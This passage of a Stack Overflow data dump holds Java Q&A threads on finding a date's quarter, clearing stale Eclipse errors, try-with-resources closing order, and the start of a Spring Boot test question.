Used this method for string representation:</p>\n\n<pre><code>int quarter = (Calendar.getInstance().get(Calendar.MONTH) / 3); // 0 to 3\nString[] mQuarterKey = {\"qt1\", \"qt2\", \"qt3\", \"qt4\"};\nString strQuarter = mQuarterKey[quarter];\n</code></pre>\n"},{"tags":[],"owner":{"account_id":275234,"reputation":2388,"user_id":567987,"accept_rate":83,"display_name":"abdolence"},"down_vote_count":0,"up_vote_count":55,"is_accepted":false,"score":55,"last_activity_date":1521128321,"creation_date":1461231111,"answer_id":36765477,"question_id":302658,"body_markdown":"In Java 8 and later, the [java.time](https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html) classes have a more simple version of it. Use [`LocalDate`](https://docs.oracle.com/javase/8/docs/api/java/time/LocalDate.html) and [`IsoFields`](https://docs.oracle.com/javase/8/docs/api/java/time/temporal/IsoFields.html)\r\n\r\n    LocalDate.now().get(IsoFields.QUARTER_OF_YEAR)","title":"How do I discover the Quarter of a given Date?","body":"<p>In Java 8 and later, the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"noreferrer\">java.time</a> classes have a more simple version of it. Use <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/LocalDate.html\" rel=\"noreferrer\"><code>LocalDate</code></a> and <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/temporal/IsoFields.html\" rel=\"noreferrer\"><code>IsoFields</code></a></p>\n\n<pre><code>LocalDate.now().get(IsoFields.QUARTER_OF_YEAR)\n</code></pre>\n"},{"tags":[],"owner":{"account_id":8990334,"reputation":41,"user_id":6702459,"display_name":"Coltini"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1471524041,"creation_date":1471524041,"answer_id":39018515,"question_id":302658,"body_markdown":"When using Joda time, use Math.ceil() function: \r\n\r\n    double quarter = Math.ceil(new Double(jodaDate.getMonthOfYear()) / 3.0);","title":"How do I discover the Quarter of a given Date?","body":"<p>When using Joda time, use Math.ceil() function: </p>\n\n<pre><code>double quarter = Math.ceil(new Double(jodaDate.getMonthOfYear()) / 3.0);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":322981,"reputation":310745,"user_id":642706,"accept_rate":58,"display_name":"Basil Bourque"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1570394279,"creation_date":1472843485,"answer_id":39299286,"question_id":302658,"body_markdown":"# tl;dr\r\n\r\n    YearQuarter\r\n    .from(\r\n        LocalDate.of( 2018 , 1 , 23 ) \r\n    )\r\n\r\n\r\n\r\n# ThreeTen-Extra\r\n\r\nThe [Answer by abdmob][1] is correct: Using [java.time][2] is the wise way to go.\r\n\r\n\r\nIn addition, the [ThreeTen-Extra](http://www.threeten.org/threeten-extra/) project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. \r\n\r\nIts useful classes include:\r\n\r\n - [`Quarter`][3]\r\n - [`YearQuarter`][4]\r\n\r\n## Current quarter\r\n\r\nTo get the current quarter, specify a time zone. Determining a quarter means determining a date. And determining a date means specifying a time zone. For any given moment, the date varies around the globe by zone. Specify by using a [proper time zone name][5] in form of `continent/region`. Never use the 3-4 letter abbreviations such as `EST` or `IST`.\r\n\r\n    ZoneId z = ZoneId.of( &quot;America/Montreal&quot; );\r\n    YearQuarter yq = YearQuarter.now( z );\r\n\r\n## Given a `java.util.Date`\r\n\r\nIf given a `java.util.Date` first convert to a java.time type. The [`Instant`](http://docs.oracle.com/javase/8/docs/api/java/time/Instant.html) class represents a moment on the timeline in [UTC](https://en.wikipedia.org/wiki/Coordinated_Universal_Time) with a resolution of [nanoseconds](https://en.wikipedia.org/wiki/Nanosecond).\r\n\r\n    Instant instant = myUtilDate.toInstant();\r\n\r\nAssign a time zone to get a `ZoneDateTime`. \r\n\r\n    ZoneId z = ZoneId.of( &quot;America/Montreal&quot; );\r\n    ZonedDateTime zdt = instant.atZone( z );\r\n\r\nGenerate a `YearQuarter` from that `ZonedDateTime`.\r\n\r\n    YearQuarter yq = YearQuarter.from( zdt );\r\n\r\n## Use throughout your code\r\n\r\nYou should be passing around instances of `YearQuarter` rather than mere numbers or strings. Using objects provides type-safety, ensures valid values, and makes your code more self-documenting.\r\n\r\n----------\r\n\r\n# About *java.time*\r\n\r\nThe [*java.time*](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/package-summary.html) framework is built into Java 8 and later. These classes supplant the troublesome old [legacy](https://en.wikipedia.org/wiki/Legacy_system) date-time classes such as [`java.util.Date`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Date.html), [`Calendar`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Calendar.html), &amp; [`SimpleDateFormat`](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/text/SimpleDateFormat.html).\r\n\r\nTo learn more, see the [*Oracle Tutorial*](http://docs.oracle.com/javase/tutorial/datetime/TOC.html). And search Stack Overflow for many examples and explanations. Specification is [JSR 310](https://jcp.org/en/jsr/detail?id=310).\r\n\r\nThe [*Joda-Time*](http://www.joda.org/joda-time/) project, now in [maintenance mode](https://en.wikipedia.org/wiki/Maintenance_mode), advises migration to the [java.time](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/package-summary.html) classes.\r\n\r\nYou may exchange *java.time* objects directly with your database. Use a [JDBC driver](https://en.wikipedia.org/wiki/JDBC_driver) compliant with [JDBC 4.2](http://openjdk.java.net/jeps/170) or later. No need for strings, no need for `java.sql.*` classes.\r\n\r\nWhere to obtain the java.time classes? \r\n\r\n - [**Java SE 8**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_8), [**Java SE 9**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_9), [**Java SE 10**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_10), [**Java SE 11**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_11), and later  - Part of the standard Java API with a bundled implementation.\r\n  - Java 9 adds some minor features and fixes.\r\n - [**Java SE 6**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_6) and [**Java SE 7**](https://en.wikipedia.org/wiki/Java_version_history#Java_SE_7)\r\n  - Most of the *java.time* functionality is back-ported to Java 6 &amp; 7 in [***ThreeTen-Backport***](http://www.threeten.org/threetenbp/).\r\n - [**Android**](https://en.wikipedia.org/wiki/Android_(operating_system))\r\n  - Later versions of Android bundle implementations of the *java.time* classes.\r\n  - For earlier Android (&lt;26), the [***ThreeTenABP***](https://github.com/JakeWharton/ThreeTenABP) project adapts [***ThreeTen-Backport***](http://www.threeten.org/threetenbp/) (mentioned above). See [*How to use ThreeTenABP…*](http://stackoverflow.com/q/38922754/642706).\r\n\r\nThe [**ThreeTen-Extra**](http://www.threeten.org/threeten-extra/) project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. You may find some useful classes here such as [`Interval`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Interval.html), [`YearWeek`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearWeek.html), [`YearQuarter`](http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html), and [more](http://www.threeten.org/threeten-extra/apidocs/index.html).\r\n\r\n\r\n  [1]: https://stackoverflow.com/a/36765477/642706\r\n  [2]: https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\r\n  [3]: http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Quarter.html\r\n  [4]: http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html\r\n  [5]: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones","title":"How do I discover the Quarter of a given Date?","body":"<h1>tl;dr</h1>\n\n<pre><code>YearQuarter\n.from(\n    LocalDate.of( 2018 , 1 , 23 ) \n)\n</code></pre>\n\n<h1>ThreeTen-Extra</h1>\n\n<p>The <a href=\"https://stackoverflow.com/a/36765477/642706\">Answer by abdmob</a> is correct: Using <a href=\"https://docs.oracle.com/javase/8/docs/api/java/time/package-summary.html\" rel=\"nofollow noreferrer\">java.time</a> is the wise way to go.</p>\n\n<p>In addition, the <a href=\"http://www.threeten.org/threeten-extra/\" rel=\"nofollow noreferrer\">ThreeTen-Extra</a> project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. </p>\n\n<p>Its useful classes include:</p>\n\n<ul>\n<li><a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Quarter.html\" rel=\"nofollow noreferrer\"><code>Quarter</code></a></li>\n<li><a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html\" rel=\"nofollow noreferrer\"><code>YearQuarter</code></a></li>\n</ul>\n\n<h2>Current quarter</h2>\n\n<p>To get the current quarter, specify a time zone. Determining a quarter means determining a date. And determining a date means specifying a time zone. For any given moment, the date varies around the globe by zone. Specify by using a <a href=\"https://en.wikipedia.org/wiki/List_of_tz_database_time_zones\" rel=\"nofollow noreferrer\">proper time zone name</a> in form of <code>continent/region</code>. Never use the 3-4 letter abbreviations such as <code>EST</code> or <code>IST</code>.</p>\n\n<pre><code>ZoneId z = ZoneId.of( \"America/Montreal\" );\nYearQuarter yq = YearQuarter.now( z );\n</code></pre>\n\n<h2>Given a <code>java.util.Date</code></h2>\n\n<p>If given a <code>java.util.Date</code> first convert to a java.time type. The <a href=\"http://docs.oracle.com/javase/8/docs/api/java/time/Instant.html\" rel=\"nofollow noreferrer\"><code>Instant</code></a> class represents a moment on the timeline in <a href=\"https://en.wikipedia.org/wiki/Coordinated_Universal_Time\" rel=\"nofollow noreferrer\">UTC</a> with a resolution of <a href=\"https://en.wikipedia.org/wiki/Nanosecond\" rel=\"nofollow noreferrer\">nanoseconds</a>.</p>\n\n<pre><code>Instant instant = myUtilDate.toInstant();\n</code></pre>\n\n<p>Assign a time zone to get a <code>ZoneDateTime</code>. </p>\n\n<pre><code>ZoneId z = ZoneId.of( \"America/Montreal\" );\nZonedDateTime zdt = instant.atZone( z );\n</code></pre>\n\n<p>Generate a <code>YearQuarter</code> from that <code>ZonedDateTime</code>.</p>\n\n<pre><code>YearQuarter yq = YearQuarter.from( zdt );\n</code></pre>\n\n<h2>Use throughout your code</h2>\n\n<p>You should be passing around instances of <code>YearQuarter</code> rather than mere numbers or strings. Using objects provides type-safety, ensures valid values, and makes your code more self-documenting.</p>\n\n<hr>\n\n<h1>About <em>java.time</em></h1>\n\n<p>The <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/package-summary.html\" rel=\"nofollow noreferrer\"><em>java.time</em></a> framework is built into Java 8 and later. These classes supplant the troublesome old <a href=\"https://en.wikipedia.org/wiki/Legacy_system\" rel=\"nofollow noreferrer\">legacy</a> date-time classes such as <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Date.html\" rel=\"nofollow noreferrer\"><code>java.util.Date</code></a>, <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/Calendar.html\" rel=\"nofollow noreferrer\"><code>Calendar</code></a>, &amp; <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/text/SimpleDateFormat.html\" rel=\"nofollow noreferrer\"><code>SimpleDateFormat</code></a>.</p>\n\n<p>To learn more, see the <a href=\"http://docs.oracle.com/javase/tutorial/datetime/TOC.html\" rel=\"nofollow noreferrer\"><em>Oracle Tutorial</em></a>. And search Stack Overflow for many examples and explanations. Specification is <a href=\"https://jcp.org/en/jsr/detail?id=310\" rel=\"nofollow noreferrer\">JSR 310</a>.</p>\n\n<p>The <a href=\"http://www.joda.org/joda-time/\" rel=\"nofollow noreferrer\"><em>Joda-Time</em></a> project, now in <a href=\"https://en.wikipedia.org/wiki/Maintenance_mode\" rel=\"nofollow noreferrer\">maintenance mode</a>, advises migration to the <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/time/package-summary.html\" rel=\"nofollow noreferrer\">java.time</a> classes.</p>\n\n<p>You may exchange <em>java.time</em> objects directly with your database. Use a <a href=\"https://en.wikipedia.org/wiki/JDBC_driver\" rel=\"nofollow noreferrer\">JDBC driver</a> compliant with <a href=\"http://openjdk.java.net/jeps/170\" rel=\"nofollow noreferrer\">JDBC 4.2</a> or later. No need for strings, no need for <code>java.sql.*</code> classes.</p>\n\n<p>Where to obtain the java.time classes? </p>\n\n<ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_8\" rel=\"nofollow noreferrer\"><strong>Java SE 8</strong></a>, <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_9\" rel=\"nofollow noreferrer\"><strong>Java SE 9</strong></a>, <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_10\" rel=\"nofollow noreferrer\"><strong>Java SE 10</strong></a>, <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_11\" rel=\"nofollow noreferrer\"><strong>Java SE 11</strong></a>, and later  - Part of the standard Java API with a bundled implementation.\n\n<ul>\n<li>Java 9 adds some minor features and fixes.</li>\n</ul></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_6\" rel=\"nofollow noreferrer\"><strong>Java SE 6</strong></a> and <a href=\"https://en.wikipedia.org/wiki/Java_version_history#Java_SE_7\" rel=\"nofollow noreferrer\"><strong>Java SE 7</strong></a>\n\n<ul>\n<li>Most of the <em>java.time</em> functionality is back-ported to Java 6 &amp; 7 in <a href=\"http://www.threeten.org/threetenbp/\" rel=\"nofollow noreferrer\"><strong><em>ThreeTen-Backport</em></strong></a>.</li>\n</ul></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Android_(operating_system)\" rel=\"nofollow noreferrer\"><strong>Android</strong></a>\n\n<ul>\n<li>Later versions of Android bundle implementations of the <em>java.time</em> classes.</li>\n<li>For earlier Android (&lt;26), the <a href=\"https://github.com/JakeWharton/ThreeTenABP\" rel=\"nofollow noreferrer\"><strong><em>ThreeTenABP</em></strong></a> project adapts <a href=\"http://www.threeten.org/threetenbp/\" rel=\"nofollow noreferrer\"><strong><em>ThreeTen-Backport</em></strong></a> (mentioned above). See <a href=\"http://stackoverflow.com/q/38922754/642706\"><em>How to use ThreeTenABP…</em></a>.</li>\n</ul></li>\n</ul>\n\n<p>The <a href=\"http://www.threeten.org/threeten-extra/\" rel=\"nofollow noreferrer\"><strong>ThreeTen-Extra</strong></a> project extends java.time with additional classes. This project is a proving ground for possible future additions to java.time. You may find some useful classes here such as <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/Interval.html\" rel=\"nofollow noreferrer\"><code>Interval</code></a>, <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearWeek.html\" rel=\"nofollow noreferrer\"><code>YearWeek</code></a>, <a href=\"http://www.threeten.org/threeten-extra/apidocs/org/threeten/extra/YearQuarter.html\" rel=\"nofollow noreferrer\"><code>YearQuarter</code></a>, and <a href=\"http://www.threeten.org/threeten-extra/apidocs/index.html\" rel=\"nofollow noreferrer\">more</a>.</p>\n"},{"tags":[],"owner":{"account_id":797901,"reputation":275,"user_id":1739053,"display_name":"nexoma"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1473668712,"creation_date":1473668712,"answer_id":39446116,"question_id":302658,"body_markdown":"\r\nwith java8  you may use formatter:\r\n\r\n    import java.time.format.DateTimeFormatter\r\n    import java.time.LocalDate\r\n    \r\n    println(&quot;withQuarter: &quot; + LocalDate.of(&quot;2016&quot;.toInt,&quot;07&quot;.toInt,1).format(DateTimeFormatter.ofPattern(&quot;yyyyQMM&quot;)))\r\n\r\n\r\nwithQuarter: 2016**3**07","title":"How do I discover the Quarter of a given Date?","body":"<p>with java8  you may use formatter:</p>\n\n<pre><code>import java.time.format.DateTimeFormatter\nimport java.time.LocalDate\n\nprintln(\"withQuarter: \" + LocalDate.of(\"2016\".toInt,\"07\".toInt,1).format(DateTimeFormatter.ofPattern(\"yyyyQMM\")))\n</code></pre>\n\n<p>withQuarter: 2016<strong>3</strong>07</p>\n"},{"tags":[],"owner":{"account_id":13555973,"reputation":93,"user_id":9781064,"display_name":"Sunila SS"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1569916013,"creation_date":1569916013,"answer_id":58180216,"question_id":302658,"body_markdown":"I use this method.\r\n\r\n\r\n     public static Integer getQuarter(Date d){\r\n        Calendar c = Calendar.getInstance();\r\n        c.setTime(d);\r\n        int month = c.get(Calendar.MONTH);\r\n        return (month /3)+1;\r\n    }","title":"How do I discover the Quarter of a given Date?","body":"<p>I use this method.</p>\n\n<pre><code> public static Integer getQuarter(Date d){\n    Calendar c = Calendar.getInstance();\n    c.setTime(d);\n    int month = c.get(Calendar.MONTH);\n    return (month /3)+1;\n}\n</code></pre>\n"}],"owner":{"account_id":1781,"reputation":91962,"user_id":2443,"accept_rate":82,"display_name":"Allain Lalonde"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":108758,"favorite_count":0,"down_vote_count":0,"up_vote_count":50,"accepted_answer_id":302669,"answer_count":14,"score":50,"last_activity_date":1683725036,"creation_date":1227114944,"question_id":302658,"body_markdown":"Given a java.util.Date object how do I go about finding what Quarter it&#39;s in?\r\n\r\nAssuming Q1 = Jan Feb Mar, Q2 = Apr, May, Jun, etc.\r\n\r\n","title":"How do I discover the Quarter of a given Date?","body":"<p>Given a java.util.Date object how do I go about finding what Quarter it's in?</p>\n\n<p>Assuming Q1 = Jan Feb Mar, Q2 = Apr, May, Jun, etc.</p>\n"},{"tags":["java","android","eclipse","adt"],"comments":[{"owner":{"account_id":199659,"reputation":4127,"user_id":445114,"accept_rate":88,"display_name":"Ran"},"score":0,"creation_date":1342439995,"post_id":11503675,"comment_id":15198601,"body_markdown":"usually for me, if I run Lint checking again then it disappears. clean might also do it.","body":"usually for me, if I run Lint checking again then it disappears. clean might also do it."},{"owner":{"account_id":270248,"reputation":5079,"user_id":560092,"accept_rate":65,"display_name":"yuttadhammo"},"score":0,"creation_date":1342440991,"post_id":11503675,"comment_id":15198995,"body_markdown":"sorry I&#39;m new to eclipse... where is lint checking?  Clean... does it, though :) also see my answer below","body":"sorry I&#39;m new to eclipse... where is lint checking?  Clean... does it, though :) also see my answer below"},{"owner":{"account_id":199659,"reputation":4127,"user_id":445114,"accept_rate":88,"display_name":"Ran"},"score":1,"creation_date":1342442318,"post_id":11503675,"comment_id":15199626,"body_markdown":"right click on the project -&gt; android -&gt; run lint. you can also clean all lint markers like the answer below suggested.","body":"right click on the project -&gt; android -&gt; run lint. you can also clean all lint markers like the answer below suggested."}],"answers":[{"tags":[],"owner":{"account_id":895181,"reputation":19702,"user_id":1056263,"accept_rate":79,"display_name":"Dmytro Danylyk"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1342439640,"creation_date":1342439640,"answer_id":11503720,"question_id":11503675,"body_markdown":"Save the the file: Ctrl + S\r\n\r\nIn eclipse menu: Project - &gt; Clean","title":"How to purge false errors in eclipse?","body":"<p>Save the the file: Ctrl + S</p>\n\n<p>In eclipse menu: Project - > Clean</p>\n"},{"tags":[],"owner":{"account_id":381163,"reputation":1955,"user_id":735675,"accept_rate":43,"display_name":"pixelscreen"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1342439703,"creation_date":1342439703,"answer_id":11503740,"question_id":11503675,"body_markdown":"1. Try cleaning your project and re-build it. It should go.\r\n2. Try restarting adt by going to DDMS&gt;devices&gt;click on the small downward arrow&gt;select &quot;reset adb&quot;\r\n3. Try restarting eclipse.\r\n\r\nAny of the above solutions may work for you.\r\n","title":"How to purge false errors in eclipse?","body":"<ol>\n<li>Try cleaning your project and re-build it. It should go.</li>\n<li>Try restarting adt by going to DDMS>devices>click on the small downward arrow>select \"reset adb\"</li>\n<li>Try restarting eclipse.</li>\n</ol>\n\n<p>Any of the above solutions may work for you.</p>\n"},{"tags":[],"owner":{"account_id":1241264,"reputation":3370,"user_id":1203810,"accept_rate":46,"display_name":"Chintan Raghwani"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1342439911,"creation_date":1342439911,"answer_id":11503789,"question_id":11503675,"body_markdown":"You are deleting larger content. But some-where at Ending close of bundle which is &quot;}&quot;, by mistake you are not deleting it. **So simply delete that &quot;}&quot;**. Then clean-up your project.","title":"How to purge false errors in eclipse?","body":"<p>You are deleting larger content. But some-where at Ending close of bundle which is \"}\", by mistake you are not deleting it. <strong>So simply delete that \"}\"</strong>. Then clean-up your project.</p>\n"},{"tags":[],"owner":{"account_id":1520237,"reputation":1141,"user_id":1420101,"accept_rate":60,"display_name":"Aviral"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1342440542,"creation_date":1342440542,"answer_id":11503996,"question_id":11503675,"body_markdown":"For me, just cutting the whole line and pasting it back gets rid of the issue.","title":"How to purge false errors in eclipse?","body":"<p>For me, just cutting the whole line and pasting it back gets rid of the issue.</p>\n"},{"tags":[],"owner":{"account_id":270248,"reputation":5079,"user_id":560092,"accept_rate":65,"display_name":"yuttadhammo"},"down_vote_count":0,"up_vote_count":6,"is_accepted":true,"score":6,"last_activity_date":1342440955,"creation_date":1342440955,"answer_id":11504121,"question_id":11503675,"body_markdown":"Most of the answers given didn&#39;t help or weren&#39;t the problem (`Clean` in Ran&#39;s comment worked, though...).  The easiest fix was CTRL+1, then &quot;Clear All Lint Markers&quot;.","title":"How to purge false errors in eclipse?","body":"<p>Most of the answers given didn't help or weren't the problem (<code>Clean</code> in Ran's comment worked, though...).  The easiest fix was CTRL+1, then \"Clear All Lint Markers\".</p>\n"},{"tags":[],"owner":{"account_id":366474,"reputation":1457,"user_id":712035,"display_name":"emallove"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1389803052,"creation_date":1389803052,"answer_id":21142758,"question_id":11503675,"body_markdown":"You can delete the supposedly false compiler errors in the [Problems view window][1], e.g.,![delete the supposedly false compiler errors (screen grab)][2]\r\n\r\n\r\nConfirm deletion even though `javac` may recreate them:\r\n\r\n![Confirm deletion even though javac may recreate them (screen grab)][3]\r\n\r\n\r\n  [1]: http://help.eclipse.org/juno/index.jsp?topic=/org.eclipse.platform.doc.user/concepts/cprbview.htm\r\n  [2]: http://i.stack.imgur.com/URNSZ.png\r\n  [3]: http://i.stack.imgur.com/iUCMi.png","title":"How to purge false errors in eclipse?","body":"<p>You can delete the supposedly false compiler errors in the <a href=\"http://help.eclipse.org/juno/index.jsp?topic=/org.eclipse.platform.doc.user/concepts/cprbview.htm\" rel=\"nofollow noreferrer\">Problems view window</a>, e.g.,<img src=\"https://i.stack.imgur.com/URNSZ.png\" alt=\"delete the supposedly false compiler errors (screen grab)\"></p>\n\n<p>Confirm deletion even though <code>javac</code> may recreate them:</p>\n\n<p><img src=\"https://i.stack.imgur.com/iUCMi.png\" alt=\"Confirm deletion even though javac may recreate them (screen grab)\"></p>\n"}],"owner":{"account_id":270248,"reputation":5079,"user_id":560092,"accept_rate":65,"display_name":"yuttadhammo"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":9562,"favorite_count":0,"down_vote_count":0,"up_vote_count":8,"accepted_answer_id":11504121,"answer_count":6,"score":8,"last_activity_date":1683724973,"creation_date":1342439446,"question_id":11503675,"body_markdown":"From time to time in eclipse with ADT, I am getting errors that stick around even after I remove the offending code; in fact, they stay even if I delete the entire content of the file, as per this screen shot:\r\n\r\n![enter image description here][1]\r\n\r\n\r\n  [1]: http://i.stack.imgur.com/3MgNg.png\r\n\r\nThe error is `Syntax error on token &quot;}&quot;, delete this token`\r\n\r\nSuffice to say, there is no such token.\r\n\r\nObviously this is a bug, but what do I do?  My code won&#39;t compile as a result.","title":"How to purge false errors in eclipse?","body":"<p>From time to time in eclipse with ADT, I am getting errors that stick around even after I remove the offending code; in fact, they stay even if I delete the entire content of the file, as per this screen shot:</p>\n\n<p><img src=\"https://i.stack.imgur.com/3MgNg.png\" alt=\"enter image description here\"></p>\n\n<p>The error is <code>Syntax error on token \"}\", delete this token</code></p>\n\n<p>Suffice to say, there is no such token.</p>\n\n<p>Obviously this is a bug, but what do I do?  My code won't compile as a result.</p>\n"},{"tags":["java","java-7","finally","try-with-resources"],"answers":[{"tags":[],"owner":{"account_id":95910,"reputation":238649,"user_id":260990,"accept_rate":81,"display_name":"jmj"},"down_vote_count":0,"up_vote_count":61,"is_accepted":true,"score":61,"last_activity_date":1476203858,"creation_date":1402348140,"answer_id":24129101,"question_id":24129088,"body_markdown":"The resource gets closed before catch or finally blocks.  See this [tutorial][1].\r\n\r\n&gt;A try-with-resources statement can have catch and finally blocks just like an ordinary try statement. In a try-with-resources statement, any catch or finally block is run after the resources declared have been closed.\r\n\r\nTo evaluate this is a sample code:\r\n\r\n    class ClosableDummy implements Closeable {\r\n        public void close() {\r\n            System.out.println(&quot;closing&quot;);\r\n        }\r\n    }\r\n    \r\n    public class ClosableDemo {\r\n        public static void main(String[] args) {\r\n            try (ClosableDummy closableDummy = new ClosableDummy()) {\r\n                System.out.println(&quot;try exit&quot;);\r\n                throw new Exception();\r\n            } catch (Exception ex) {\r\n                System.out.println(&quot;catch&quot;);\r\n            } finally {\r\n                System.out.println(&quot;finally&quot;);\r\n            }\r\n    \r\n    \r\n        }\r\n    }\r\n\r\n**Output:**\r\n\r\n    try exit\r\n    closing\r\n    catch\r\n    finally\r\n\r\n  [1]: http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html\r\n","title":"Are resources closed before or after the finally?","body":"<p>The resource gets closed before catch or finally blocks.  See this <a href=\"http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html\" rel=\"noreferrer\">tutorial</a>.</p>\n\n<blockquote>\n  <p>A try-with-resources statement can have catch and finally blocks just like an ordinary try statement. In a try-with-resources statement, any catch or finally block is run after the resources declared have been closed.</p>\n</blockquote>\n\n<p>To evaluate this is a sample code:</p>\n\n<pre><code>class ClosableDummy implements Closeable {\n    public void close() {\n        System.out.println(\"closing\");\n    }\n}\n\npublic class ClosableDemo {\n    public static void main(String[] args) {\n        try (ClosableDummy closableDummy = new ClosableDummy()) {\n            System.out.println(\"try exit\");\n            throw new Exception();\n        } catch (Exception ex) {\n            System.out.println(\"catch\");\n        } finally {\n            System.out.println(\"finally\");\n        }\n\n\n    }\n}\n</code></pre>\n\n<p><strong>Output:</strong></p>\n\n<pre><code>try exit\nclosing\ncatch\nfinally\n</code></pre>\n"},{"tags":[],"owner":{"account_id":222360,"reputation":7605,"user_id":480894,"accept_rate":72,"display_name":"Roland"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1683724333,"creation_date":1568816208,"answer_id":57994925,"question_id":24129088,"body_markdown":"According to the JLS 13; [14.20.3.2. Extended try-with-resources](https://docs.oracle.com/javase/specs/jls/se13/html/jls-14.html#jls-14.20.3.2)\r\n\r\nThe finally block is the last to be executed:\r\n\r\n&gt; Furthermore, all resources will have been closed (or attempted to be\r\n&gt; closed) by the time the finally block is executed, in keeping with the\r\n&gt; intent of the finally keyword.\r\n\r\n","title":"Are resources closed before or after the finally?","body":"<p>According to the JLS 13; <a href=\"https://docs.oracle.com/javase/specs/jls/se13/html/jls-14.html#jls-14.20.3.2\" rel=\"nofollow noreferrer\">14.20.3.2. Extended try-with-resources</a></p>\n<p>The finally block is the last to be executed:</p>\n<blockquote>\n<p>Furthermore, all resources will have been closed (or attempted to be\nclosed) by the time the finally block is executed, in keeping with the\nintent of the finally keyword.</p>\n</blockquote>\n"}],"owner":{"account_id":1413944,"reputation":59678,"user_id":1339987,"accept_rate":54,"display_name":"djechlin"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6404,"favorite_count":0,"down_vote_count":1,"up_vote_count":41,"accepted_answer_id":24129101,"answer_count":2,"score":40,"last_activity_date":1683724333,"creation_date":1402348089,"question_id":24129088,"body_markdown":"In Java 7&#39;s try-with-resources, I don&#39;t know which order the finally block and the auto-closing happens. What&#39;s the order?\r\n\r\n    BaseResource b = new BaseResource(); // not auto-closeable; must be stop&#39;ed\r\n    try(AdvancedResource a = new AdvancedResource(b)) {\r\n\r\n    }\r\n    finally {\r\n        b.stop(); // will this happen before or after a.close()?\r\n    }","title":"Are resources closed before or after the finally?","body":"<p>In Java 7's try-with-resources, I don't know which order the finally block and the auto-closing happens. What's the order?</p>\n\n<pre><code>BaseResource b = new BaseResource(); // not auto-closeable; must be stop'ed\ntry(AdvancedResource a = new AdvancedResource(b)) {\n\n}\nfinally {\n    b.stop(); // will this happen before or after a.close()?\n}\n</code></pre>\n"},{"tags":["java","spring","spring-boot","spring-mvc"],"comments":[{"owner":{"account_id":3192259,"reputation":117599,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1683721784,"post_id":76218419,"comment_id":134409705,"body_markdown":"Remove `@Runwith` as you should e using JUnit5 this is for junit4.","body":"Remove <code>@Runwith</code> as you should e using JUnit5 this is for junit4."},{"owner":{"account_id":2794316,"reputation":1918,"user_id":2403836,"accept_rate":72,"display_name":"mr nooby noob"},"score":0,"creation_date":1683722187,"post_id":76218419,"comment_id":134409815,"body_markdown":"@M.Deinum tried that as well, and there is no difference either, when I only have SpringBootTest and AutoConfigureMockMvc","body":"@M.Deinum tried that as well, and there is no difference either, when I only have SpringBootTest and AutoConfigureMockMvc"},{"owner":{"account_id":3192259,"reputation":117599,"user_id":2696260,"display_name":"M. Deinum"},"score":0,"creation_date":1683722559,"post_id":76218419,"comment_id":134409916,"body_markdown":"Then please add the full testcase (including imports etc) and the 